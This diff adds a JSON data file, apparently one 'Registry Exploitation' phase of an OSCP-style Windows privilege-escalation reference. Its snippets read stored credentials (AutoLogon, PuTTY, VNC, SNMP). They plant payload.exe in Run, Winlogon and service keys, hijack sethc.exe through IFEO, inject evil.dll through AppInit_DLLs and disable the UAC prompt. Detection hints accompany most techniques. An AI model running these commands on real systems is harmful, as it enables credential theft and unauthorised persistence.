@@ -1,0 +1,438 @@
+{
+  "phase": {
+    "id": "registry",
+    "title": "Registry Exploitation",
+    "summary": "Registry-based privilege escalation: AlwaysInstallElevated, AutoLogon credentials, AutoRun keys, modifiable hijack keys.",
+    "icon": "database"
+  },
+  "nodes": [
+    {
+      "id": "reg-alwaysinstallelevated",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "AlwaysInstallElevated MSI as SYSTEM",
+      "severity": "critical",
+      "difficulty": "oscp-basic",
+      "summary": "If both HKLM and HKCU AlwaysInstallElevated == 1, any MSI runs as SYSTEM.",
+      "description_md": "Cross-linked from `svc-always-installed-elevated` in Phase 5 because it's often discovered via service/registry enum.",
+      "related": [
+        "svc-always-installed-elevated"
+      ],
+      "tags": [
+        "registry",
+        "msi"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Probe both hives",
+          "code": "reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"
+        }
+      ],
+      "references": []
+    },
+    {
+      "id": "reg-autologon",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "AutoLogon credentials in Winlogon",
+      "severity": "high",
+      "difficulty": "oscp-basic",
+      "summary": "DefaultUserName / DefaultPassword in plaintext under HKLM\\...\\Winlogon when AutoAdminLogon is enabled.",
+      "mitre_attack_id": "T1552.002",
+      "tags": [
+        "registry",
+        "credentials"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "reg query Winlogon",
+          "code": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultDomainName /v DefaultUserName /v DefaultPassword /v AutoAdminLogon"
+        },
+        {
+          "shell": "powershell",
+          "title": "PowerShell read",
+          "code": "Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon' | Select AutoAdminLogon, DefaultUserName, DefaultPassword"
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE T1552.002",
+          "url": "https://attack.mitre.org/techniques/T1552/002/",
+          "kind": "mitre"
+        }
+      ],
+      "description_md": "Windows AutoLogon stores credentials in plaintext under `HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon` when an administrator configures automatic user login (e.g., kiosk, headless server). The `DefaultUserName` and `DefaultPassword` values are readable by any user without requiring administrator rights.\n\n**What to look for**:\n- `AutoAdminLogon = 1` — confirms autologon is configured\n- `DefaultUserName` — the username (may include domain prefix)\n- `DefaultPassword` — plaintext password\n- `DefaultDomainName` — optional domain\n\n**Impact**: The recovered credentials are often reused across the environment. Test them via `runas`, SMB (`smbclient`), or RDP before moving on.\n\n**Prevalence**: Very common in industrial, retail, and education environments that configure kiosk-style workstations.",
+      "detection_hints": "Registry reads of `DefaultPassword` by non-SYSTEM accounts (EID 4663 if object auditing is configured); the credential is a static secret — rotate immediately on finding."
+    },
+    {
+      "id": "reg-autoruns",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "AutoRun keys with writable targets",
+      "severity": "high",
+      "difficulty": "oscp-basic",
+      "summary": "Run / RunOnce keys can reference binaries in writable directories — replace and wait for next admin logon.",
+      "mitre_attack_id": "T1547.001",
+      "tags": [
+        "registry",
+        "autorun",
+        "persistence"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Dump autorun keys",
+          "code": "reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE T1547.001",
+          "url": "https://attack.mitre.org/techniques/T1547/001/",
+          "kind": "mitre"
+        }
+      ],
+      "description_md": "AutoRun and AutoStart registry keys execute binaries at user logon or system startup. The key security check is whether the **target binary** (not the key itself) is stored in a writable directory. If a SYSTEM user or an admin has a run-key pointing to `C:\\Tools\\updater.exe`, and `C:\\Tools\\` is world-writable, you can overwrite the binary.\n\n**Keys to check**:\n- `HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run` (all users)\n- `HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce`\n- `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run` (current user)\n- `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce`\n\n**Workflow**: Dump key values, extract binary paths, run `icacls` or `accesschk` against each. A writable target binary + admin/SYSTEM runs it = SYSTEM execution on next logon.",
+      "detection_hints": "Writes to Run/RunOnce key values (EID 13 in Sysmon); file writes to directories referenced by existing autorun entries; EID 4688 for unexpected processes launched at logon."
+    },
+    {
+      "id": "reg-putty-sessions",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "Saved PuTTY sessions (proxy passwords)",
+      "severity": "medium",
+      "difficulty": "oscp-advanced",
+      "summary": "PuTTY stores proxy credentials in cleartext under HKCU.",
+      "tags": [
+        "registry",
+        "credentials",
+        "putty"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Dump sessions",
+          "code": "reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions /s"
+        }
+      ],
+      "references": [],
+      "description_md": "PuTTY stores saved SSH session configurations under `HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\\`. Each named session may contain proxy credentials in cleartext: `ProxyUsername` and `ProxyPassword` values under the session key.\n\n**What's recoverable**:\n- `ProxyUsername` / `ProxyPassword` — proxy auth credentials (cleartext)\n- `HostName` / `PortNumber` — target host information\n- `UserName` — SSH username (but not the key or SSH password)\n\n**Scope**: These credentials are scoped to the current user's HKCU hive. If you can read another user's hive (via SeBackupPrivilege or from a shadow copy), check their sessions too.\n\n**Exploitation**: Proxy credentials often reuse corporate passwords. Test recovered credentials against VPN, web proxies, and other SSH targets.",
+      "detection_hints": "Registry reads of PuTTY session keys; enumeration of all user hives by non-SYSTEM accounts."
+    },
+    {
+      "id": "reg-winlogon-shell",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "Modifiable Winlogon\\Shell value",
+      "severity": "high",
+      "difficulty": "oscp-advanced",
+      "summary": "When the Shell value is writable, replace it; next interactive logon spawns your payload as the logging-in user.",
+      "tags": [
+        "registry",
+        "persistence"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Read",
+          "code": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Shell"
+        }
+      ],
+      "references": [],
+      "description_md": "The `Shell` value under `HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon` specifies the user-shell process launched by Winlogon at interactive logon. Normally set to `explorer.exe`, it can be overwritten (if the key is writable) to any binary.\n\n**Attack scenario**:\n1. Verify `Shell` key is writable: `accesschk.exe /accepteula -kvuqsw hklm\\...\\Winlogon`\n2. Write your payload: `reg add \"HKLM\\...\\Winlogon\" /v Shell /d \"C:\\Temp\\payload.exe\" /f`\n3. Wait for the next interactive logon — the logging-in user's context executes your payload\n\n**Persistence vs. escalation**: If the victim is a standard user, you gain their context. If an admin logs in next, you gain admin. If SYSTEM auto-logs in, you get SYSTEM.\n\n**Note**: Breaking `Shell` stops Explorer from launching — the user sees a blank desktop. Use a wrapper that spawns the original `explorer.exe,C:\\Temp\\payload.exe` to avoid detection.",
+      "detection_hints": "Modifications to the Winlogon `Shell` registry value (Sysmon EID 13); unexpected processes as the immediate child of `winlogon.exe` at logon; blank desktop after login reported by users."
+    },
+    {
+      "id": "reg-image-file-execution-options",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "Image File Execution Options (IFEO) Debugger hijack",
+      "severity": "high",
+      "difficulty": "oscp-advanced",
+      "summary": "Set a Debugger value under IFEO to launch your binary whenever the target executable starts.",
+      "mitre_attack_id": "T1546.012",
+      "tags": [
+        "registry",
+        "persistence",
+        "ifeo"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Sticky-keys IFEO trick",
+          "code": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \"C:\\Windows\\System32\\cmd.exe\" /f"
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE T1546.012",
+          "url": "https://attack.mitre.org/techniques/T1546/012/",
+          "kind": "mitre"
+        }
+      ],
+      "detection_hints": "Any IFEO Debugger value pointing at an interactive shell is highly suspicious.",
+      "description_md": "The Image File Execution Options (IFEO) registry key (`HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\`) is used by Windows for debugging — a `Debugger` value causes Windows to launch the specified debugger whenever the target executable is started, passing the original process as an argument.\n\nAn attacker with admin rights can set `Debugger=C:\\Windows\\System32\\cmd.exe` for any binary, causing cmd to launch whenever that program runs.\n\n**Accessibility tool hijack (classic technique)**:\n- Target: `sethc.exe` (Sticky Keys), `utilman.exe` (Ease of Access), `osk.exe` (On-Screen Keyboard)\n- These binaries launch at the Windows login screen as SYSTEM\n- Setting `Debugger=cmd.exe` on them spawns a SYSTEM command prompt at the lock screen\n\n**Post-admin use**: This technique requires write to `HKLM` (admin), so it's typically used for **persistence** or to exploit a locked machine, not initial escalation."
+    },
+    {
+      "id": "reg-appinit-dlls",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "AppInit_DLLs injection",
+      "summary": "DLLs in AppInit_DLLs load into every user32-linked process — admin write = broad code exec.",
+      "description_md": "If `LoadAppInit_DLLs` is enabled and you can write `AppInit_DLLs`, your DLL loads into nearly every GUI process. Disabled by default under Secure Boot, but still seen on legacy/server builds.",
+      "severity": "high",
+      "difficulty": "oscp-advanced",
+      "mitre_attack_id": "T1546.010",
+      "detection_hints": "Writes to HKLM\\...\\Windows\\AppInit_DLLs and unexpected modules loaded across many processes.",
+      "tags": [
+        "registry",
+        "dll-injection",
+        "persistence"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Check & set",
+          "code": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\" /v AppInit_DLLs\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\" /v AppInit_DLLs /d \"C:\\Temp\\evil.dll\" /f",
+          "requires_admin": true
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE T1546.010 — AppInit DLLs",
+          "url": "https://attack.mitre.org/techniques/T1546/010/",
+          "kind": "mitre"
+        }
+      ]
+    },
+    {
+      "id": "reg-runonce",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "Run / RunOnce key write",
+      "summary": "Writable HKLM Run keys execute your payload as the next user to log on.",
+      "description_md": "`HKLM\\...\\Run` and `RunOnce` execute at logon. If a higher-privileged user logs in after you plant a value, your code runs in their context. Check ACLs on the keys.",
+      "severity": "high",
+      "difficulty": "oscp-basic",
+      "mitre_attack_id": "T1547.001",
+      "tags": [
+        "registry",
+        "autorun",
+        "persistence"
+      ],
+      "related": [
+        "reg-autoruns",
+        "start-run-keys"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Plant Run value",
+          "code": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Updater /d \"C:\\Temp\\payload.exe\" /f"
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE T1547.001 — Registry Run Keys",
+          "url": "https://attack.mitre.org/techniques/T1547/001/",
+          "kind": "mitre"
+        }
+      ]
+    },
+    {
+      "id": "reg-userinit",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "Winlogon Userinit / Shell append",
+      "summary": "Append your binary to Userinit/Shell so it runs at every interactive logon.",
+      "description_md": "`Userinit` and `Shell` under the Winlogon key are comma-separated lists executed at logon. Appending a path (keeping `userinit.exe,`/`explorer.exe,`) runs your code for the logging-on user.",
+      "severity": "high",
+      "difficulty": "oscp-basic",
+      "mitre_attack_id": "T1547.004",
+      "tags": [
+        "registry",
+        "winlogon",
+        "persistence"
+      ],
+      "related": [
+        "reg-winlogon-shell"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Append to Userinit",
+          "code": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Userinit /d \"C:\\Windows\\system32\\userinit.exe,C:\\Temp\\payload.exe\" /f",
+          "requires_admin": true
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE T1547.004 — Winlogon Helper DLL",
+          "url": "https://attack.mitre.org/techniques/T1547/004/",
+          "kind": "mitre"
+        }
+      ]
+    },
+    {
+      "id": "reg-service-imagepath",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "Service ImagePath via registry",
+      "summary": "Writable service key lets you rewrite ImagePath to your binary.",
+      "description_md": "Service configuration lives under `HKLM\\SYSTEM\\CurrentControlSet\\Services\\<svc>`. If the key ACL grants you write, change `ImagePath` and restart the service to run as its (often SYSTEM) account — the registry twin of `sc config binPath`.",
+      "severity": "critical",
+      "difficulty": "oscp-advanced",
+      "tags": [
+        "registry",
+        "services"
+      ],
+      "related": [
+        "svc-registry-acl"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Rewrite ImagePath",
+          "code": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\VulnSvc\" /v ImagePath /t REG_EXPAND_SZ /d \"C:\\Temp\\payload.exe\" /f\nsc start VulnSvc"
+        }
+      ],
+      "references": [
+        {
+          "title": "HackTricks — Services",
+          "url": "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services",
+          "kind": "hacktricks"
+        }
+      ]
+    },
+    {
+      "id": "reg-env-path",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "System PATH manipulation",
+      "summary": "Writable system PATH entry enables DLL/EXE hijacking against SYSTEM processes.",
+      "description_md": "If the machine `PATH` (HKLM Environment) contains a directory you can write to, binaries/DLLs resolved by name from privileged processes can be hijacked. Pair with phantom-DLL hunting.",
+      "severity": "high",
+      "difficulty": "oscp-advanced",
+      "tags": [
+        "registry",
+        "path",
+        "hijack"
+      ],
+      "related": [
+        "path-writable-dir"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Read system PATH",
+          "code": "reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment\" /v Path"
+        }
+      ],
+      "references": [
+        {
+          "title": "HackTricks — DLL Hijacking",
+          "url": "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking",
+          "kind": "hacktricks"
+        }
+      ]
+    },
+    {
+      "id": "reg-vnc-passwords",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "Stored VNC passwords",
+      "summary": "RealVNC/TightVNC/UltraVNC store obfuscated passwords in the registry.",
+      "description_md": "VNC servers persist a fixed-key DES-obfuscated password under their registry keys. Recover the blob and decrypt with the well-known key (e.g. `vncpwd`).",
+      "severity": "medium",
+      "difficulty": "oscp-basic",
+      "mitre_attack_id": "T1552.002",
+      "tags": [
+        "registry",
+        "credentials",
+        "vnc"
+      ],
+      "related": [
+        "cred-search-files"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Common VNC keys",
+          "code": "reg query \"HKLM\\SOFTWARE\\RealVNC\\vncserver\" /v Password\nreg query \"HKCU\\Software\\TightVNC\\Server\" /v Password"
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE T1552.002 — Credentials in Registry",
+          "url": "https://attack.mitre.org/techniques/T1552/002/",
+          "kind": "mitre"
+        }
+      ]
+    },
+    {
+      "id": "reg-snmp-community",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "SNMP community strings",
+      "summary": "SNMP config in the registry can leak community strings and credentials.",
+      "description_md": "The SNMP service stores community strings under `HKLM\\SYSTEM\\CurrentControlSet\\Services\\SNMP\\Parameters`. Read-write communities can pivot to device/router control.",
+      "severity": "medium",
+      "difficulty": "oscp-advanced",
+      "mitre_attack_id": "T1552.002",
+      "tags": [
+        "registry",
+        "snmp",
+        "credentials"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Read communities",
+          "code": "reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\SNMP\\Parameters\\ValidCommunities\""
+        }
+      ],
+      "references": [
+        {
+          "title": "HackTricks — SNMP",
+          "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp",
+          "kind": "hacktricks"
+        }
+      ]
+    },
+    {
+      "id": "reg-uac-disable",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "Disable UAC via registry",
+      "summary": "With admin, flip EnableLUA / ConsentPromptBehaviorAdmin to remove the prompt.",
+      "description_md": "Once at High integrity you can lower UAC for future logons by setting `EnableLUA=0` or `ConsentPromptBehaviorAdmin=0`. Loud and persistent — better suited to lab work than stealthy ops.",
+      "severity": "high",
+      "difficulty": "oscp-basic",
+      "detection_hints": "Changes to EnableLUA / ConsentPromptBehaviorAdmin under Policies\\System.",
+      "tags": [
+        "registry",
+        "uac"
+      ],
+      "related": [
+        "enum-integrity-uac"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Disable consent prompt",
+          "code": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f",
+          "requires_admin": true
+        }
+      ],
+      "references": [
+        {
+          "title": "HackTricks — UAC",
+          "url": "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/uac-user-account-control",
+          "kind": "hacktricks"
+        }
+      ]
+    }
+  ]
+}
